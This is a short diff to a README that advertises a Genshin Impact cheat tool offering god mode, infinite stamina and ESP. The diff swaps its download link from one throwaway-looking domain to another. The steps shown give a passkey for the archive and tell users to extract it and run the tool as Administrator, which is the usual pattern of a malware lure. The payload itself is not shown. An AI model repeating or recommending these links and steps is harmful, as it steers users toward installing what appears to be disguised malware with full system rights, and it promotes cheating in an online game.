@@ -6,7 +6,7 @@ Genshin Impact external tool with god mode, infinite stamina, no cooldown, ESP, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -81,7 +81,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Genshin Impact.
 4. Run the tool **as Administrator**.
